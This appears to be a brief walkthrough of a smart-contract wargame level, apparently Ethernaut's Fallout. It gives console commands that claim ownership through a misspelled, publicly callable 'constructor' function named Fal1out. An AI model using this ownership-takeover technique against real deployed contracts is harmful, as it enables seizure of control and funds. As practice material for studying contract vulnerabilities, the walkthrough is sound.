# Checking owner
await contract.owner()

# Constructor is not the constructor
contract.Fal1out({from: "0x5Fb17f13465950ED8726f7ECE8CBA3dFB37566aF", value: toWei(0.0009, "ether")})

# Checking new owner
await contract.owner()
